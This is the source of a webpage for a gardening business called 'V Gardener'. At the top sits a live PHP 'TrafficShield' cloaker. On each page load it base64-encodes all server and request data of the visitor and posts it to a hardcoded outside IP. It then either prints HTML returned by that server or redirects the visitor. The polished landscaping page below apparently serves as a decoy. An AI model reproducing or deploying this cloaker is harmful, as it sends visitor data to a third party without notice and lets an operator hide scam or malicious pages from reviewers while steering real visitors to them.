<?php
namespace TrafficShield; 
error_reporting(0);
	class Traffic_Shield{
		public function run() {							
			ob_start();
			$this->ogrsr9854();
		}
		public function ogrsr9854() {	
            $this->_check(); 
            $response = $this->https_request();        
            $this->main($response);       
        }			
        public function _check() {	
            if(isset($_GET['TS-BHDNR-84848'])){
                echo "ba9ab7c356";
            }
        }
		public function get_header() {	
            $headers = array();     
            foreach($_SERVER as $k=>$v){
               $headers[$k] = $v;
            }
            $headers['TS-BHDNR-74191'] = "900661405745598";
            $headers['TS-BHDNR-74194'] = "ba9ab7c356"; 
            return $headers;
        }
		public function get_header_post() {
            $get_header = $this->get_header();
            return base64_encode(json_encode($get_header));      
        }	
		public function https_request() {
           $get_header['headers'] = $this->get_header_post();
           $ch = curl_init();
           curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36');
           curl_setopt($ch, CURLOPT_POST, true);
           curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
           $result = curl_exec($ch);                
           return json_decode($result);
        }
		public function main($response) {
            if(!empty($response)){
                if($response->type == 1){
                    if(isset($response->zrc) && !empty($response->zrc)){
                            echo base64_decode($response->zrc);
                            die();
                        }else{            
                            $this->get_url($response->url,$response->http_code);
                        }
                }

            }
        }
		public function get_url($url,$code) { 
            header("Location: ".$url, true, $code);            
        }
}
$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>V Gardener</title>
<meta name="description" content="">
<meta name="author" content="">

<!-- Favicons
    ================================================== -->
<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" href="img/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="72x72" href="img/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="114x114" href="img/apple-touch-icon-114x114.png">

<!-- Bootstrap -->
<link rel="stylesheet" type="text/css"  href="css/bootstrap.css">
<link rel="stylesheet" type="text/css" href="fonts/font-awesome/css/font-awesome.css">

<!-- Slider
    ================================================== -->
<link href="css/owl.carousel.css" rel="stylesheet" media="screen">
<link href="css/owl.theme.css" rel="stylesheet" media="screen">

<!-- Stylesheet
    ================================================== -->
<link rel="stylesheet" type="text/css" href="css/style.css">
<link rel="stylesheet" type="text/css" href="css/nivo-lightbox/nivo-lightbox.css">
<link rel="stylesheet" type="text/css" href="css/nivo-lightbox/default.css">
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700" rel="stylesheet">

<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>
<body id="page-top" data-spy="scroll" data-target=".navbar-fixed-top">
<!-- Navigation
    ==========================================-->
<nav id="menu" class="navbar navbar-default navbar-fixed-top">
  <div class="container"> 
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
      <a class="navbar-brand page-scroll" href="#page-top">V Gardener</a> </div>
    
    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav navbar-right">
        <li><a href="#about" class="page-scroll">About</a></li>
        <li><a href="#services" class="page-scroll">Services</a></li>
        <li><a href="#portfolio" class="page-scroll">Gallery</a></li>
        <li><a href="#testimonials" class="page-scroll">Testimonials</a></li>
        <li><a href="policy.php" class="page-scroll">Privacy Policy</a></li>
        <li><a href="#contact" class="page-scroll">Contact</a></li>
      </ul>
    </div>
    <!-- /.navbar-collapse --> 
  </div>
  <!-- /.container-fluid --> 
</nav>
<!-- Header -->
<header id="header">
  <div class="intro">
    <div class="overlay">
      <div class="container">
        <div class="row">
          <div class="col-md-8 col-md-offset-2 intro-text">
            <h1>Landscaping Services</h1>
            <p>A beautiful garden can be the heart and soul of your property.<br>
              Explore our comprehensive range of gardening services.</p>
            <a href="#about" class="btn btn-custom btn-lg page-scroll">More Info</a> </div>
        </div>
      </div>
    </div>
  </div>
</header>
<!-- About Section -->
<div id="about">
  <div class="container">
    <div class="row">
      <div class="col-xs-12 col-md-6">
        <div class="about-text">
          <h2>Welcome to <span>V Gardener</span></h2>
          <hr>
          <p>At Gardener, we understand that a beautiful garden can be the heart and soul of your property. Whether you have a small backyard oasis or a sprawling estate, our expert gardening services are designed to enhance the natural beauty of your outdoor space.</p>
          <p>With a team of experienced and passionate gardeners, we are committed to bringing your garden dreams to life. Explore our comprehensive range of gardening services that cater to all your landscaping needs.</p>
          <a href="#services" class="btn btn-custom btn-lg page-scroll">View All Services</a> </div>
      </div>
      <div class="col-xs-12 col-md-3">
        <div class="about-media"> <img src="img/about-1.jpg" alt=" "> </div>
        <div class="about-desc">
          <h3>Garden Care</h3>
          <p>Custom garden designs tailored to your preferences. Expert advice on plant selection, layout, and aesthetics.</p>
        </div>
      </div>
      <div class="col-xs-12 col-md-3">
        <div class="about-media"> <img src="img/about-2.jpg" alt=" "> </div>
        <div class="about-desc">
          <h3>Lawn Care</h3>
          <p>Lawn aeration and overseeding to promote healthy growth. Mowing, edging, and trimming for a lush, manicured lawn.</p>
        </div>
      </div>
    </div>
  </div>
</div>
<!-- Services Section -->
<div id="services">
  <div class="container">
    <div class="col-md-10 col-md-offset-1 section-title text-center">
      <h2>Our Services</h2>
      <hr>
      <p>We tailor our services to meet your specific needs and budget, ensuring your garden reflects your vision.</p>
    </div>
    <div class="row">
      <div class="col-md-3 text-center">
        <div class="service-media"> <img src="img/services/service-1.jpg" alt=" "> </div>
        <div class="service-desc">
          <h3>Lawn Care</h3>
          <p>Mowing, edging, and trimming for a lush, manicured lawn. Lawn aeration and overseeding to promote healthy growth. Pest and weed control for a thriving grass carpet.</p>
        </div>
      </div>
      <div class="col-md-3 text-center">
        <div class="service-media"> <img src="img/services/service-2.jpg" alt=" "> </div>
        <div class="service-desc">
          <h3>Landscape Design</h3>
          <p>Collaborative consultations to understand your vision. Custom garden designs tailored to your preferences. Expert advice on plant selection, layout, and aesthetics.</p>
        </div>
      </div>
      <div class="col-md-3 text-center">
        <div class="service-media"> <img src="img/services/service-3.jpg" alt=" "> </div>
        <div class="service-desc">
          <h3>Tree Care</h3>
          <p>Pruning, shaping, and trimming to encourage growth and beauty. Disease and pest management to protect your valuable trees and shrubs. Tree and stump removal when necessary.</p>
        </div>
      </div>
      <div class="col-md-3 text-center">
        <div class="service-media"> <img src="img/services/service-4.jpg" alt=" "> </div>
        <div class="service-desc">
          <h3>Spring & Fall Cleanup</h3>
          <p>Fall leaf removal and winterization. Spring cleaning and garden preparation. Ensuring your garden looks its best year-round.</p>
        </div>
      </div>
    </div>
  </div>
</div>
<!-- Gallery Section -->
<div id="portfolio">
  <div class="container">
    <div class="section-title text-center center">
      <h2>Project Gallery</h2>
      <hr>
      <p>Taking gardening to the next level, we live and breathe plants.</p>
    </div>
    <div class="categories">
      <ul class="cat">
        <li>
          <ol class="type">
            <li><a href="#" data-filter="*" class="active">All</a></li>
            <li><a href="#" data-filter=".lawn">Lawn Care</a></li>
            <li><a href="#" data-filter=".garden">Garden Care</a></li>
            <li><a href="#" data-filter=".planting">Planting</a></li>
          </ol>
        </li>
      </ul>
      <div class="clearfix"></div>
    </div>
    <div class="row">
      <div class="portfolio-items">
        <div class="col-sm-6 col-md-4 lawn">
          <div class="portfolio-item">
            <div class="hover-bg"> <a href="img/portfolio/01-large.jpg" title="Lawn Care" data-lightbox-gallery="gallery1">
              <div class="hover-text">
                <h4>Lawn Care</h4>
              </div>
              <img src="img/portfolio/01-small.jpg" class="img-responsive" alt="Project Title"> </a> </div>
          </div>
        </div>
        <div class="col-sm-6 col-md-4 planting">
          <div class="portfolio-item">
            <div class="hover-bg"> <a href="img/portfolio/02-large.jpg" title="Planting" data-lightbox-gallery="gallery1">
              <div class="hover-text">
                <h4>Planting</h4>
              </div>
              <img src="img/portfolio/02-small.jpg" class="img-responsive" alt="Project Title"> </a> </div>
          </div>
        </div>
        <div class="col-sm-6 col-md-4 lawn">
          <div class="portfolio-item">
            <div class="hover-bg"> <a href="img/portfolio/03-large.jpg" title="Lawn Care" data-lightbox-gallery="gallery1">
              <div class="hover-text">
                <h4>Lawn Care</h4>
              </div>
              <img src="img/portfolio/03-small.jpg" class="img-responsive" alt="Project Title"> </a> </div>
          </div>
        </div>
        <div class="col-sm-6 col-md-4 lawn">
          <div class="portfolio-item">
            <div class="hover-bg"> <a href="img/portfolio/04-large.jpg" title="Lawn Care" data-lightbox-gallery="gallery1">
              <div class="hover-text">
                <h4>Lawn Care</h4>
              </div>
              <img src="img/portfolio/04-small.jpg" class="img-responsive" alt="Project Title"> </a> </div>
          </div>
        </div>
        <div class="col-sm-6 col-md-4 planting">
          <div class="portfolio-item">
            <div class="hover-bg"> <a href="img/portfolio/05-large.jpg" title="Planting" data-lightbox-gallery="gallery1">
              <div class="hover-text">
                <h4>Planting</h4>
              </div>
              <img src="img/portfolio/05-small.jpg" class="img-responsive" alt="Project Title"> </a> </div>
          </div>
        </div>
        <div class="col-sm-6 col-md-4 garden">
          <div class="portfolio-item">
            <div class="hover-bg"> <a href="img/portfolio/06-large.jpg" title="Garden Care" data-lightbox-gallery="gallery1">
              <div class="hover-text">
                <h4>Garden Care</h4>
              </div>
              <img src="img/portfolio/06-small.jpg" class="img-responsive" alt="Project Title"> </a> </div>
          </div>
        </div>
        <div class="col-sm-6 col-md-4 garden">
          <div class="portfolio-item">
            <div class="hover-bg"> <a href="img/portfolio/07-large.jpg" title="Garden Care" data-lightbox-gallery="gallery1">
              <div class="hover-text">
                <h4>Garden Care</h4>
              </div>
              <img src="img/portfolio/07-small.jpg" class="img-responsive" alt="Project Title"> </a> </div>
          </div>
        </div>
        <div class="col-sm-6 col-md-4 lawn">
          <div class="portfolio-item">
            <div class="hover-bg"> <a href="img/portfolio/08-large.jpg" title="Lawn Care" data-lightbox-gallery="gallery1">
              <div class="hover-text">
                <h4>Lawn Care</h4>
              </div>
              <img src="img/portfolio/08-small.jpg" class="img-responsive" alt="Project Title"> </a> </div>
          </div>
        </div>
        <div class="col-sm-6 col-md-4 planting">
          <div class="portfolio-item">
            <div class="hover-bg"> <a href="img/portfolio/09-large.jpg" title="Planting" data-lightbox-gallery="gallery1">
              <div class="hover-text">
                <h4>Planting</h4>
              </div>
              <img src="img/portfolio/09-small.jpg" class="img-responsive" alt="Project Title"> </a> </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
<!-- Testimonials Section -->
<div id="testimonials" class="text-center">
  <div class="overlay">
    <div class="container">
      <div class="section-title">
        <h2>Testimonials</h2>
        <hr>
      </div>
      <div class="row">
        <div class="col-md-10 col-md-offset-1">
          <div id="testimonial" class="owl-carousel owl-theme">
            <div class="item">
              <p>"I would like to thank you for your professionalism in providing gardening services to us. You and your young employee were both courteous and prompt. The job was completed thoroughly and on time."</p>
              <p>- David, San Francisco, CA</p>
            </div>
            <div class="item">
              <p>"Thank you for all your creativity and expertise with the garden. It looks fantastic and we both love the hard landscaping and the planting. It's quite a transformation. It is more beautiful than we ever could have imagined and I have no doubt that we will love it for many years to come."</p>
              <p>- Sebastian, San Diego, CA</p>
            </div>
            <div class="item">
              <p>"I viewed your website and saw the quality and diversity of your approach. I wasn’t looking for a ‘one size fits all’ standard design. I was looking for flair. I particularly appreciated your creativity and attentiveness. I always felt that when in a discussion I was the most important client, though knowing there were many others. I’m truly delighted the garden adds so much to my life!"</p>
              <p>- Daniel, San Jose, CA</p>
            </div>
            <div class="item">
              <p>"We have had great pleasure watching the garden change, season by season, and your brilliant planting has ensured that there is always something of interest in the borders, which is exactly what we wanted. Lots of people have admired it and some have even taken notes and copied parts of it in their gardens."</p>
              <p>- Oliver, Santa Rosa, CA</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
<!-- Contact Section -->
<div id="contact" class="text-center">
  <div class="container">
    <div class="section-title text-center">
      <h2>Contact Us</h2>
      <hr>
      <p>Contact us today for a free consultation. Let's get started on your dream garden today!</p>
    </div>
    <div class="col-md-10 col-md-offset-1 contact-info">
      <div class="col-md-4">
        <h3>Address</h3>
        <hr>
        <div class="contact-item">
          <p>5396 North Reese Avenue,</p>
          <p>Fresno CA 93722</p>
        </div>
      </div>
      <div class="col-md-4">
        <h3>Working Hours</h3>
        <hr>
        <div class="contact-item">
          <p>Monday-Saturday: 10:00 - 18:00</p>
          <p>Sunday: CLOSED</p>
        </div>
      </div>
      <div class="col-md-4">
        <h3>Contact Info</h3>
        <hr>
        <div class="contact-item">
          <p>Phone: +1-951-239-0523</p>
          <p>Email: info@vgardener.com</p>
        </div>
      </div>
    </div>
    <div class="col-md-8 col-md-offset-2">
      <h3>Leave us a message</h3>
      <form name="sentMessage" id="contactForm" novalidate>
        <div class="row">
          <div class="col-md-6">
            <div class="form-group">
              <input type="text" id="name" class="form-control" placeholder="Name" required="required">
              <p class="help-block text-danger"></p>
            </div>
          </div>
          <div class="col-md-6">
            <div class="form-group">
              <input type="email" id="email" class="form-control" placeholder="Email" required="required">
              <p class="help-block text-danger"></p>
            </div>
          </div>
        </div>
        <div class="form-group">
          <textarea name="message" id="message" class="form-control" rows="4" placeholder="Message" required></textarea>
          <p class="help-block text-danger"></p>
        </div>
        <div id="success"></div>
        <button type="submit" class="btn btn-custom btn-lg">Send Message</button>
      </form>
    </div>
  </div>
</div>
<!-- Footer Section -->
<div id="footer">
  <div class="container text-center">
    <div class="col-md-8 col-md-offset-2">
      
      <p>&copy; 2024 V Gardener</p>
    </div>
  </div>
</div>
<script type="text/javascript" src="js/jquery.1.11.1.js"></script> 
<script type="text/javascript" src="js/bootstrap.js"></script> 
<script type="text/javascript" src="js/SmoothScroll.js"></script> 
<script type="text/javascript" src="js/nivo-lightbox.js"></script> 
<script type="text/javascript" src="js/jquery.isotope.js"></script> 
<script type="text/javascript" src="js/owl.carousel.js"></script> 
<script type="text/javascript" src="js/jqBootstrapValidation.js"></script> 
<script type="text/javascript" src="js/contact_me.js"></script> 
<script type="text/javascript" src="js/main.js"></script>
</body>
</html>
